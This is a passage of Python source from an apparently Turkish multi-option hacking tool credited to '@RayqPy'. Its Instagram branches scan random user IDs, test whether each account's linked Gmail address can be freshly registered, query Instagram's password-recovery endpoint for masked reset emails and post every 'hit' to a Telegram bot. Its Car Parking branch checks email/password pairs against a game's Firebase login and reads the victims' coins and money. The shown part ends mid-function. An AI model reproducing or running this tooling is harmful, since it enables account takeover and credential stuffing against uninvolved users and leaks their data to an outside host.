    white = "\033[1m\033[37m"
    orange = "\033[1m\033[38;5;208m"
    reset = "\033[0m"
    
    total_hits = 0
    hits = 0
    bad_insta = 0
    bad_email = 0
    good_ig = 0
    infoinsta = {}
    
    
    
    
    
    
    
    
    
    ID = input('chat id:  ')
    
    token = input('token: ')
    
    
    os.system('clear')
    
    def pppp():
        ge = hits               
        bt = bad_insta + bad_email 
        be = good_ig  
        print(yellow + f"""\r
    {P1}Hits : {M}{ge} {W9}Bad Mail : {M}{bt}  {Z}Bad İnsta : {M}{be} @RayqPy
    \r""")
    
    def update_stats():
        os.system('clear')
        pppp()
    
    def Rayq():
        try:
            alphabet = 'azertyuiopmlkjhgfdsqwxcvbn'
            n1 = ''.join(choice(alphabet) for _ in range(randrange(6, 9)))
            n2 = ''.join(choice(alphabet) for _ in range(randrange(3, 9)))
            host = ''.join(choice(alphabet) for _ in range(randrange(15, 30)))
            headers = {
                'accept': '*/*',
                'accept-language': 'ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6',
                rayqig["content_type_header"]: rayqig["content_type_form_alt"],
                'google-accounts-xsrf': '1',
                rayqig["user_agent_header"]: str(generate_user_agent())
            }
            recovery_url = f"{rayqig['google_accounts_url']}/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB"
            res1 = requests.get(recovery_url, headers=headers)
            tok = re.search(
                'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',
                res1.text
            ).group(2)
            cookies = {'__Host-GAPS': host}
            headers2 = {
                rayqig["authority_header"]: rayqig["google_accounts_domain"],
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                rayqig["content_type_header"]: rayqig["content_type_form_alt"],
                'google-accounts-xsrf': '1',
                rayqig["origin_header"]: rayqig["google_accounts_url"],
                rayqig["referrer_header"]: 'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn',
                rayqig["user_agent_header"]: generate_user_agent()
            }
            data = {
                'f.req': f'["{tok}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
                'deviceinfo': ('[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,'
                               'null,0,1,"",null,null,2,2]')
            }
            response = requests.post(f"{rayqig['google_accounts_url']}/_/signup/validatepersonaldetails",
                                     cookies=cookies, headers=headers2, data=data)
            token_line = str(response.text).split('",null,"')[1].split('"')[0]
            host = response.cookies.get_dict()['__Host-GAPS']
            with open(rayqig["token_file"], 'w') as f:
                f.write(f"{token_line}//{host}\n")
        except Exception as e:
            print(e)
            Rayq()
    
    Rayq()
    
    
    
    
    
    def check_gmail(email):
        global bad_email, hits
        try:
            if '@' in email:
                email = email.split('@')[0]
            with open(rayqig["token_file"], 'r') as f:
                token_data = f.read().splitlines()[0]
            tl, host = token_data.split('//')
            cookies = {'__Host-GAPS': host}
            headers = {
                rayqig["authority_header"]: rayqig["google_accounts_domain"],
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                rayqig["content_type_header"]: rayqig["content_type_form_alt"],
                'google-accounts-xsrf': '1',
                rayqig["origin_header"]: rayqig["google_accounts_url"],
                rayqig["referrer_header"]: f"https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&TL={tl}",
                rayqig["user_agent_header"]: generate_user_agent()
            }
            params = {'TL': tl}
            data = (f"continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn"
                    f"&f.req=%5B%22TL%3A{tl}%22%2C%22{email}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D"
                    "&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false"
                    "&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22"
                    "%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D"
                    "&gmscoreversion=undefined&flowName=GlifWebSignIn&")
            response = pp(f"{rayqig['google_accounts_url']}/_/signup/usernameavailability",
                          params=params, cookies=cookies, headers=headers, data=data)
            if '"gf.uar",1' in response.text:
                hits += 1
                update_stats()
                full_email = email + rayqig["rayqdomain"]
                InfoAcc(email, full_email)
            else:
                bad_email += 1
                update_stats()
        except Exception:
            pass
    
    
    
    
    
    
    def check(email):
        global good_ig, bad_insta
        ua = generate_user_agent()
        dev = 'android-'
        device_id = dev + hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:16]
        uui = str(uuid.uuid4())
        headers = {
            rayqig["user_agent_header"]: ua,
            rayqig["cookie_header"]: rayqig["cookie_value"],
            rayqig["content_type_header"]: rayqig["content_type_form"]
        }
        data = {
            rayqig["signed_body"]: ('0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.' +
                                         json.dumps({
                                             '_csrftoken': '9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
                                             'adid': uui,
                                             'guid': uui,
                                             'device_id': device_id,
                                             'query': email
                                         })),
            rayqig["ig_sig_key_version"]: '4'
        }
        response = requests.post(rayqig["instagram_recovery_url"], headers=headers, data=data).text
        if email in response:
            if rayqig["rayqdomain"] in email:
                check_gmail(email)
            good_ig += 1
            update_stats()
        else:
            bad_insta += 1
            update_stats()
    
    
    
    
    
    
    
    
    
    def rest(user):
        try:
            headers = {
                'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
                'X-Pigeon-Rawclienttime': '1700251574.982',
                'X-IG-Connection-Speed': '-1kbps',
                'X-IG-Bandwidth-Speed-KBPS': '-1.000',
                'X-IG-Bandwidth-TotalBytes-B': '0',
                'X-IG-Bandwidth-TotalTime-MS': '0',
                'X-Bloks-Version-Id': ('c80c5fb30dfae9e273e4009f03b18280'
                                       'bb343b0862d663f31a3c63f13a9f31c0'),
                'X-IG-Connection-Type': 'WIFI',
                'X-IG-Capabilities': '3brTvw==',
                'X-IG-App-ID': '567067343352427',
                rayqig["user_agent_header"]: ('Instagram 100.0.0.17.129 Android (29/10; 420dpi; '
                                                  '1080x2129; samsung; SM-M205F; m20lte; exynos7904; '
                                                  'en_GB; 161478664)'),
                'Accept-Language': 'en-GB, en-US',
                rayqig["cookie_header"]: rayqig["cookie_value"],
                rayqig["content_type_header"]: rayqig["content_type_form"],
                'Accept-Encoding': 'gzip, deflate',
                'Host': 'i.instagram.com',
                'X-FB-HTTP-Engine': 'Liger',
                'Connection': 'keep-alive',
                'Content-Length': '356'
            }
            data = {
                rayqig["signed_body"]: ('0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.'
                                             '{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj",'
                                             '"adid":"0dfaf820-2748-4634-9365-c3d8c8011256",'
                                             '"guid":"1f784431-2663-4db9-b624-86bd9ce1d084",'
                                             '"device_id":"android-b93ddb37e983481c",'
                                             '"query":"' + user + '"}'),
                rayqig["ig_sig_key_version"]: '4'
            }
            response = requests.post(rayqig["instagram_recovery_url"], headers=headers, data=data).json()
            rayqreset = response.get('email', 'h h h')
        except:
            rayqreset = 'h h h'
        return rayqreset
    
    def InfoAcc(username, domain):
        global total_hits
        account_info = infoinsta.get(username, {})
        user_id = account_info.get('pk', 0)
        try:
            user_id_int = int(user_id)
        except:
            user_id_int = 0
    
        # Kayıt yılı tespiti
        if 900990001 <= user_id_int <= 1629010000:
            reg_date = 2013
            total_hits += 1  # SADECE 2013 için sayaç artır
        elif 1 < user_id_int <= 1278889:
            reg_date = 2010
        elif 1279000 <= user_id_int <= 17750000:
            reg_date = 2011
        elif 17750001 <= user_id_int <= 279760000:
            reg_date = 2012
        elif 279760001 <= user_id_int <= 900990000:
            reg_date = 2013  # BU alana düşmeyecek, çünkü ID aralığı dışı
        elif 1629010001 <= user_id_int <= 2369359761:
            reg_date = 2015
        elif 2369359762 <= user_id_int <= 4239516754:
            reg_date = 2016
        elif 4239516755 <= user_id_int <= 6345108209:
            reg_date = 2017
        elif 6345108210 <= user_id_int <= 10016232395:
            reg_date = 2018
        elif 10016232396 <= user_id_int <= 27238602159:
            reg_date = 2019
        elif 27238602160 <= user_id_int <= 43464475395:
            reg_date = 2020
        elif 43464475396 <= user_id_int <= 50289297647:
            reg_date = 2021
        elif 50289297648 <= user_id_int <= 57464707082:
            reg_date = 2022
        elif 57464707083 <= user_id_int <= 63313426938:
            reg_date = 2023
        else:
            reg_date = "2024 or 2025"
    
        full_name = account_info.get('full_name', '')
        followers = account_info.get('follower_count', '')
        following = account_info.get('following_count', '')
        
        tlg = f"""
𝙃𝙞𝙩 𝘼𝙘𝙘𝙤𝙪𝙣𝙩 𝙄𝙣𝙨𝙩𝙖𝙜𝙧𝙖𝙢
══════𝗥𝗔𝗬𝗤══════
𝐇𝐢𝐭𝐬: {total_hits}
𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞: {username}
𝐌𝐚𝐢𝐥:  {username}@gmail.com
𝐅𝐨𝐥𝐥𝐨𝐰𝐞𝐫𝐬:  {followers} 
𝐅𝐨𝐥𝐥𝐨𝐰𝐢𝐧𝐠:  {following} 
𝐃𝐚𝐭𝐞:  {reg_date}
𝐁𝐢𝐨:  {account_info.get('biography','')}
𝐑𝐞𝐬𝐭: {rest(username)}
𝐋𝐢𝐧𝐤: 
https://www.instagram.com/{username}
══════𝗥𝗔𝗬𝗤══════
𝑩𝒀 @RayqPy ~ @RayqTool
    """
        with open('Rayq2013.txt', 'a') as f:
            f.write(tlg + "\n")
        try:
            requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={tlg}")
        except Exception:
            pass
    
    
    
    
    
    
    
    def rayqtool():
        session = requests.Session()
        while True:
            try:
                # Yalnızca 2013 user_id aralığı
                user_id = random.randint(279760001, 900990000)
                data = {
                    'lsd': ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
                    'variables': json.dumps({
                        'id': user_id,
                        'render_surface': 'PROFILE'
                    }),
                    'doc_id': '25618261841150840'
                }
                headers = {'X-FB-LSD': data['lsd']}
                response = session.post('https://www.instagram.com/api/graphql', headers=headers, data=data)
                account = response.json().get('data', {}).get('user', {})
                username = account.get('username')
                if username:
                    followers = account.get('follower_count', 0)
                    infoinsta[username] = account
                    email = username + rayqig["rayqdomain"]
                    check(email)
            except Exception:
                pass
    
    
    
    
    
    
    def stats_loop():
        while True:
            update_stats()
            time.sleep(1)
    
    
    
    
    
    
    Thread(target=stats_loop, daemon=True).start()
    
    
    
    
    
    for _ in range(200):
        Thread(target=rayqtool).start()
        
        
elif secim == "4":
    print(">>> Rayq Filtreli İnstagram çalışıyor...")
    
    import os
    import sys
    import re
    import json
    import string
    import random
    import hashlib
    import uuid
    import time
    from datetime import datetime
    from threading import Thread, Lock
    import requests
    from requests import post as pp
    from user_agent import generate_user_agent
    from random import choice, randrange
    from cfonts import render
    from colorama import Fore, Style, init
    import pyfiglet
    import shutil
    from time import sleep
    import os
    from colorama import Fore
    from shutil import get_terminal_size
    
    API_CONFIG = {
        "instagram_recovery_url": "https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/",
        "ig_sig_key_version": "ig_sig_key_version",
        "signed_body": "signed_body",
        "cookie_value": "mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj",
        "content_type_header": "Content-Type",
        "cookie_header": "Cookie",
        "user_agent_header": "User-Agent",
        "default_user_agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
        ),
        "google_accounts_url": "https://accounts.google.com",
        "google_accounts_domain": "accounts.google.com",
        "referrer_header": "referer",
        "origin_header": "origin",
        "authority_header": "authority",
        "content_type_form": "application/x-www-form-urlencoded; charset=UTF-8",
        "content_type_form_alt": "application/x-www-form-urlencoded;charset=UTF-8",
        "token_file": "tl.txt",
        "durdurulmaz_domain": "@gmail.com"
    }
    
    E = '\033[1;31m'
    W9 = "\033[1m\033[34m"
    M = '\x1b[1;37m'
    HH = '\033[1;34m'
    R = '\033[1;31;40m'
    F = '\033[1;32;40m'
    C = "\033[1;97;40m"
    B = '\033[1;36;40m'
    C1 = '\x1b[38;5;120m'
    P1 = '\x1b[38;5;150m'
    P2 = '\x1b[38;5;190m'
    G = '\033[1;34m'
    
    total_hits = 0
    hits = 0
    bad_insta = 0
    bad_email = 0
    good_ig = 0
    infoinsta = {}
    
    session = requests.Session()
    
    
    
    
    
    
    from colorama import Fore, init
    import pyfiglet
    
    init(autoreset=True)
    
    ascii_art = pyfiglet.figlet_format("Instagram ", font="small")
    
    
    print(f"{Fore.YELLOW}{ascii_art}")
    print(f"{Fore.CYAN}Developed by @RusyaBaskan")
    print("")
    
    ID = input("- İD GİR: ")
    TOKEN = input("- TOKEN GİR: ")
    min_followers = int(input("- Minimum takipçi sayısını girin (ör. 100): "))
    
    def pppp():
        ge = hits               
        bt = bad_insta + bad_email 
        be = good_ig
        os.system('cls' if os.name == 'nt' else 'clear')       
        print(f" \r{C1}Hıt: {M}{ge} {E} Bad: {HH}{bt} {W9}False: {HH}{M}{be}")
    
    def update_stats():
        pppp()
    
    
    def otuzbir():
        try:
            alphabet = 'azertyuiopmlkjhgfdsqwxcvbn'
            n1 = ''.join(choice(alphabet) for _ in range(randrange(6, 9)))
            n2 = ''.join(choice(alphabet) for _ in range(randrange(3, 9)))
            host = ''.join(choice(alphabet) for _ in range(randrange(15, 30)))
            headers = {
                'accept': '*/*',
                'accept-language': 'ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6',
                API_CONFIG["content_type_header"]: API_CONFIG["content_type_form_alt"],
                'google-accounts-xsrf': '1',
                API_CONFIG["user_agent_header"]: str(generate_user_agent())
            }
            recovery_url = (f"{API_CONFIG['google_accounts_url']}/signin/v2/usernamerecovery"
                            "?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB")
            res1 = requests.get(recovery_url, headers=headers)
            match = re.search(
                'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',
                res1.text
            )
            if match:
                tok = match.group(2)
            else:
                raise Exception("Token bulunamadı")
            cookies = {'__Host-GAPS': host}
            headers2 = {
                API_CONFIG["authority_header"]: API_CONFIG["google_accounts_domain"],
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                API_CONFIG["content_type_header"]: API_CONFIG["content_type_form_alt"],
                'google-accounts-xsrf': '1',
                API_CONFIG["origin_header"]: API_CONFIG["google_accounts_url"],
                API_CONFIG["referrer_header"]: ('https://accounts.google.com/signup/v2/createaccount'
                                                '?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn'),
                API_CONFIG["user_agent_header"]: generate_user_agent()
            }
            data = {
                'f.req': f'["{tok}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
                'deviceinfo': ('[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,'
                               'null,0,1,"",null,null,2,2]')
            }
            response = requests.post(f"{API_CONFIG['google_accounts_url']}/_/signup/validatepersonaldetails",
                                     cookies=cookies, headers=headers2, data=data)
            token_line = str(response.text).split('",null,"')[1].split('"')[0]
            host = response.cookies.get_dict().get('__Host-GAPS', host)
            with open(API_CONFIG["token_file"], 'w') as f:
                f.write(f"{token_line}//{host}\n")
        except Exception as e:
            print(" hata:", e)
            otuzbir()
    
    
    otuzbir()
    
    
    def check_gmail(email):
        global bad_email, hits
        try:
            if '@' in email:
                email = email.split('@')[0]
            with open(API_CONFIG["token_file"], 'r') as f:
                token_data = f.read().splitlines()[0]
            tl, host = token_data.split('//')
            cookies = {'__Host-GAPS': host}
            headers = {
                API_CONFIG["authority_header"]: API_CONFIG["google_accounts_domain"],
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                API_CONFIG["content_type_header"]: API_CONFIG["content_type_form_alt"],
                'google-accounts-xsrf': '1',
                API_CONFIG["origin_header"]: API_CONFIG["google_accounts_url"],
                API_CONFIG["referrer_header"]: f"https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&TL={tl}",
                API_CONFIG["user_agent_header"]: generate_user_agent()
            }
            params = {'TL': tl}
            data = (f"continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn"
                    f"&f.req=%5B%22TL%3A{tl}%22%2C%22{email}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D"
                    "&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false"
                    "&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22"
                    "%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D"
                    "&gmscoreversion=undefined&flowName=GlifWebSignIn&")
            response = pp(f"{API_CONFIG['google_accounts_url']}/_/signup/usernameavailability",
                          params=params, cookies=cookies, headers=headers, data=data)
            if '"gf.uar",1' in response.text:
                hits += 1
                update_stats()
                full_email = email + API_CONFIG["durdurulmaz_domain"]
                InfoAcc(email, full_email.split('@')[1])
            else:
                bad_email += 1
                update_stats()
        except Exception as e:
            print("check_gmail hata:", e)
            pass
    
    def check(email):
        global good_ig, bad_insta
        ua = generate_user_agent()
        dev = 'android-'
        device_id = dev + hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:16]
        uui = str(uuid.uuid4())
        headers = {
            API_CONFIG["user_agent_header"]: ua,
            API_CONFIG["cookie_header"]: API_CONFIG["cookie_value"],
            API_CONFIG["content_type_header"]: API_CONFIG["content_type_form"]
        }
        data = {
            API_CONFIG["signed_body"]: (
                '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.' +
                json.dumps({
                    '_csrftoken': '9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
                    'adid': uui,
                    'guid': uui,
                    'device_id': device_id,
                    'query': email
                })
            ),
            API_CONFIG["ig_sig_key_version"]: '4'
        }
        response = session.post(API_CONFIG["instagram_recovery_url"], headers=headers, data=data).text
        if email in response:
            if API_CONFIG["durdurulmaz_domain"] in email:
                check_gmail(email)
            good_ig += 1
            update_stats()
        else:
            bad_insta += 1
            update_stats()
    
    def rest(user):
        try:
            headers = {
                'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
                'X-Pigeon-Rawclienttime': '1700251574.982',
                'X-IG-Connection-Speed': '-1kbps',
                'X-IG-Bandwidth-Speed-KBPS': '-1.000',
                'X-IG-Bandwidth-TotalBytes-B': '0',
                'X-IG-Bandwidth-TotalTime-MS': '0',
                'X-Bloks-Version-Id': ('c80c5fb30dfae9e273e4009f03b18280'
                                       'bb343b0862d663f31a3c63f13a9f31c0'),
                'X-IG-Connection-Type': 'WIFI',
                'X-IG-Capabilities': '3brTvw==',
                'X-IG-App-ID': '567067343352427',
                API_CONFIG["user_agent_header"]: ('Instagram 100.0.0.17.129 Android (29/10; 420dpi; '
                                                  '1080x2129; samsung; SM-M205F; m20lte; exynos7904; '
                                                  'en_GB; 161478664)'),
                'Accept-Language': 'en-GB, en-US',
                API_CONFIG["cookie_header"]: API_CONFIG["cookie_value"],
                API_CONFIG["content_type_header"]: API_CONFIG["content_type_form"],
                'Accept-Encoding': 'gzip, deflate',
                'Host': 'i.instagram.com',
                'X-FB-HTTP-Engine': 'Liger',
                'Connection': 'keep-alive',
                'Content-Length': '356'
            }
            data = {
                API_CONFIG["signed_body"]: (
                    '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.' +
                    '{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj",'
                    '"adid":"0dfaf820-2748-4634-9365-c3d8c8011256",'
                    '"guid":"1f784431-2663-4db9-b624-86bd9ce1d084",'
                    '"device_id":"android-b93ddb37e983481c",'
                    '"query":"' + user + '"}'
                ),
                API_CONFIG["ig_sig_key_version"]: '4'
            }
            response = session.post(API_CONFIG["instagram_recovery_url"], headers=headers, data=data).json()
            return response.get('email', 'h h h')
        except Exception as e:
            print("rest fonksiyonunda hata:", e)
            return 'h h h'
    
    def InfoAcc(username, domain):
        global total_hits
        account_info = infoinsta.get(username, {})
        user_id = account_info.get('pk', 0)
        try:
            user_id_int = int(user_id)
        except:
            user_id_int = 0
    
        if 1 < user_id_int <= 1278889:
            reg_date = 2010
        elif 1279000 <= user_id_int <= 17750000:
            reg_date = 2011
        elif 17750001 <= user_id_int <= 279760000:
            reg_date = 2012
        elif 279760001 <= user_id_int <= 900990000:
            reg_date = 2013
        elif 900990001 <= user_id_int <= 1629010000:
            reg_date = 2014
        elif 1629010001 <= user_id_int <= 2369359761:
            reg_date = 2015
        elif 2369359762 <= user_id_int <= 4239516754:
            reg_date = 2016
        elif 4239516755 <= user_id_int <= 6345108209:
            reg_date = 2017
        elif 6345108210 <= user_id_int <= 10016232395:
            reg_date = 2018
        elif 10016232396 <= user_id_int <= 27238602159:
            reg_date = 2019
        elif 27238602160 <= user_id_int <= 43464475395:
            reg_date = 2020
        elif 43464475396 <= user_id_int <= 50289297647:
            reg_date = 2021
        elif 50289297648 <= user_id_int <= 57464707082:
            reg_date = 2022
        elif 57464707083 <= user_id_int <= 63313426938:
            reg_date = 2023
        else:
            reg_date = "2024 or 2025"
    
        followers = account_info.get('follower_count', 0)
        try:
            followers = int(followers)
        except:
            followers = 0
        
        # Sadece minimum takipçi filtresi
        if followers < min_followers:
            return
    
        try:
            is_business_api = account_info.get('is_business', False)
            acct_type = str(account_info.get('account_type', ''))
            is_business = bool(is_business_api) or (acct_type.upper() == 'BUSINESS')
        except Exception as e:
            is_business = False
            print("Business flag parse error: {e}")
    
        meta_status = "Meta Aktif ✅ " if followers > 99 else "Aktif Deği𝗅 ❌"
        
        following = account_info.get('following_count', '')
        total_hits += 1
        info_text = f"""
    𝙃𝙞𝙩 𝘼𝙘𝙘𝙤𝙪𝙣𝙩 𝙄𝙣𝙨𝙩𝙖𝙜𝙧𝙖𝙢
    ══════𝗥𝗔𝗬𝗤══════
    𝐇𝐢𝐭𝐬: {total_hits}
    𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞: {username}
    𝐌𝐚𝐢𝐥: {username}@{domain}
    𝐅𝐨𝐥𝐥𝐨𝐰𝐞𝐫𝐬: {followers}
    𝐅𝐨𝐥𝐥𝐨𝐰𝐢𝐧𝐠: {following}
    𝐌𝐞𝐭𝐚: {meta_status}
    𝐁𝐮𝐬𝐢𝐧𝐞𝐬𝐬: {is_business}
    𝐃𝐚𝐭𝐞: {reg_date}
    𝐁𝐢𝐨: {account_info.get('biography','')}
    𝐑𝐞𝐬𝐭: {rest(username)}
    𝐋𝐢𝐧𝐤: 
     https://www.instagram.com/{username}
    ══════𝗥𝗔𝗬𝗤══════
     𝑩𝒀 ~ @RayqPy ~ @RayqChannel
     
    """
        with open('RayqHit.txt', 'a') as f:
            f.write(info_text + "\n")
        try:
            requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&text={info_text}")
        except Exception as e:
            print("Telegram mesajı gönderilemedi:", e)
    
    def durdurulmaz_python():
        while True:
            data = {
                'lsd': ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
                'variables': json.dumps({
                    'id': int(random.randrange(1629010000, 2500000000)),
                    'render_surface': 'PROFILE'
                }),
                'doc_id': '25618261841150840'
            }
            headers = {'X-FB-LSD': data['lsd']}
            try:
                response = requests.post('https://www.instagram.com/api/graphql', headers=headers, data=data)
                account = response.json().get('data', {}).get('user', {})
                username = account.get('username')
                if username:
                    followers = account.get('follower_count', 0)
                    # Sadece minimum takipçi filtresi
                    if followers < min_followers:
                        continue
                    infoinsta[username] = account
                    email = username + API_CONFIG["durdurulmaz_domain"]
                    check(email)
            except Exception as e:
                pass
    
    def stats_loop():
        while True:
            update_stats()
            time.sleep(1)
    
    Thread(target=stats_loop, daemon=True).start()
    
    for _ in range(100):
        Thread(target=durdurulmaz_python).start()
    
        
elif secim == "5":
    print(">>> Rayq Car Parking ...")
    
    import requests , json , datetime , random ,os , threading , webbrowser
    try:
        from colorama import Fore
    except:
        os.system('pip install colorama')
        from colorama import Fore
    try:
        from cfonts import render, say
    except:
        os.system('pip install python-cfonts')
        from cfonts import render, say
    try:
        from names import get_first_name
    except:
        os.system('pip install names')
        from names import get_first_name
    os.system('clear')
    
    from cfonts import render, say
    
    rayq = render('Rayq', colors=['green', 'white'], align='center')
    
    print(f'''
    {rayq}
       ''')
    
    
    headers = {
        "Content-Type": "application/json",
        "X-Android-Package": "com.olzhas.carparking.multyplayer",
        "X-Android-Cert": "D4962F8124C2E09A66B97C8E326AFF805489FE39",
        "Accept-Language": "tr-TR, en-US",
        "X-Client-Version": "Android/Fallback/X22001001/FirebaseCore-Android",
        "X-Firebase-GMPID": "1:581727203278:android:af6b7dee042c8df539459f",
        "X-Firebase-Client": "H4sIAAAAAAAAAKtWykhNLCpJSk0sKVayio7VUSpLLSrOzM9TslIyUqoFAFyivEQfAAAA",
        "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; A5010 Build/PI)",
        "Host": "www.googleapis.com",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip"
    }
    
    a32 = '\x1b[38;5;180m' ; a14 = '\x1b[38;5;153m'
    V1 = '\033[2;32m' ; V2 = '\033[1;33m' ; V3='\x1b[38;5;209m' ; V4= '\x1b[1;97m' ; V5 = '\x1b[38;5;8m' ; X= '\033[1;33m' ; F = '\033[2;32m'
    a32 = '\x1b[38;5;180m'  
    a14 = '\x1b[38;5;153m'  
    P = '\x1b[1;97m'
    H = '\x1b[1;92m'
    K = '\x1b[1;93m'
    R1 = '\033[1;31;40m'
    X1 = '\033[1;33;40m' 
    F1= '\033[1;32;40m' 
    C1 = "\033[1;97;40m" 
    B1 = '\033[1;36;40m'
    K1 = '\033[1;35;40m'
    V1 = '\033[1;36;40m'
    b = random.randint(5,208)
    bo = f'\x1b[38;5;{b}m'
    E = '\033[1;31m' 
    X= '\033[1;33m' 
    F = '\033[2;32m' 
    Ca = "\033[1;97m" 
    B = '\033[2;36m'
    Y = '\033[1;34m' 
    Ca = "\033[1;97m" 
    y = '\033[1;35m'
    f = '\033[2;35m'
    z = '\033[3;33m'
    uk= [X,F,f,Y,B,Ca,y]
    co1= random.choice(uk)
    col2= random.choice(uk)
    col3= random.choice(uk)
    col4= random.choice(uk)
    col5= random.choice(uk)
    
    def clear():
        print("Devopoled By: @RayqPy")
        print("CarParking Tool")
       
        
    hits=0
    bad=0
    clear()
    ID = input(f'\n{a32} Id Gir : ')
    token = input(f'\n{a14} Token Gir : ')
    os.system('clear' if os.name == 'posix' else 'cls')
    
    
    
    def decode_nested_json(d):
        for key, value in d.items():
            if isinstance(value, str):
                try:
                    nested_value = json.loads(value)
                    d[key] = decode_nested_json(nested_value)
                except json.JSONDecodeError:
                    continue
            elif isinstance(value, dict):
                d[key] = decode_nested_json(value)
        return d
    
    def login(email,password):
        global hits,bad
        data = {
            "email": email,
            "password": password,
            "returnSecureToken": True,
            "clientType": "CLIENT_TYPE_ANDROID"
        }
        res = requests.post("https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM", json=data, headers=headers).json()
        if "idToken" in res:
            tkn = res["idToken"]
            data2 = {
                "idToken": tkn
            }
            res2 = requests.post("https://www.googleapis.com/identitytoolkit/v3/relyingparty/getAccountInfo?key=AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM", json=data2, headers=headers).json()
            deta=res2['users'][0]['createdAt']
            data3 = {
                "data": "2893216D41959108CB8FA08951CB319B7AD80D02"
            }
            he = {
                "authorization": f"Bearer {tkn}",
                "firebase-instance-id-token": "f0Rstd-MTbydQx9M2eLlTM:APA91bF7UdxnXLAaybpBODKCRnyLu44eFWygoIfnLn7kOE9aujlb5WcvTv-EyA5mTNbVBPQ-r-x967XJqEA3TX23gGyXCSbMEEa2PIccvNU98uEcdun1qMgYbCOY4hPBBD2w6G9mfX_m",
                "content-type": "application/json; charset=utf-8",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/3.12.13"
            }
            info = requests.post("https://us-central1-cp-multiplayer.cloudfunctions.net/GetPlayerRecords2", json=data3, headers=he).text
    
            data_account = json.loads(info)
            if 'result' in data_account:data_account['result'] = decode_nested_json(json.loads(data_account['result']))
    
            result_account = data_account["result"]
            try:Player_name = result_account['Name']
            except:Player_name = 'None'
            try:Friends_count = len(result_account['FriendsID'])
            except:Friends_count = 'None'
            try:Coins = result_account['coin']
            except:Coins = 'None'
            try:Money = result_account['money']
            except:Money = 'None'
